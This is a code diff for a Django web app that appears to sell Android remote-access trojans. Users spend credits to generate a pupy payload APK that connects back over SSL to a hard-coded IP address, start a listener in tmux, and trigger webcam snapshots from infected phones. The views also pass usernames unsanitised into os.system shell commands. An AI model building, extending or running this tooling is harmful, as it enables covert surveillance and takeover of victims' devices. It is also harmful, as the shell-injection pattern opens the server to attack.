@@ -19,11 +19,12 @@ def add(request):
     if credits.number > 0:
         credits.number-=1
         credits.save()
-        port = 4444+int(request.user.id)
+        port = 6666+int(request.user.id)
         host='185.120.221.217:'+str(port)
         username = request.user.username
-        dir = '/root/django/users/'+ str(username)+'/'+str(username)
+        dir = '/root/django/users/'+ str(username)+'/pupy/'+str(username)
         d=os.system('mkdir /root/django/users/'+ str(username))
+        d=os.system('mkdir /root/django/users/'+ str(username)+'/pupy')
         c=os.system('cd /root/django/pupy/pupy ;./pupygen.py -O android -o '+ str(dir)+'.apk connect --host '+str(host)+' --transport ssl')
         if c == 0:
             c = "Your rat created in "+ str(dir)+".apk"
@@ -39,28 +40,28 @@ def add(request):
 #///////////////// listeniing
 def listen(request):
     username = request.user.username
-    dir = '/root/django/users/'+ str(username)+'/'+str(username)
+    dir = '/root/django/users/'+ str(username)+'/pupy/'
     commandd = "tmux new-session -s "+str(username)
     os.system('xterm -T "'+str(username)+'-pupy" -e '+str(commandd))
     return render(
         request,
-        'listen.html',
+        'pupy/android/listen.html',
         context={
         }
     )
 def startlisten(request):
     username = request.user.username
-    dir = '/root/django/users/'+ str(username)+'/'+str(username)
+    port = 6666+int(request.user.id)
 
-    os.system('tmux send-keys -t '+str(username)+'-pupy" /root/django/pupy/pupy/pupysh.py""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "/root/django/pupy/pupy/pupysh.py -a ssl '+str(port)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:pupy/android/listen')
 
 def webcamsnap(request):
     username = request.user.username
-    dir = '/root/django/users/'+ str(username)+'/'
+    dir = '/root/django/users/'+ str(username)+'/pupy/'
 
     os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 1 -o '+str(dir)+'""\n"')
     os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 2 -o '+str(dir)+'""\n"')
 
-    return redirect('RAT:listen')
+    return redirect('RAT:pupy/android/listen')
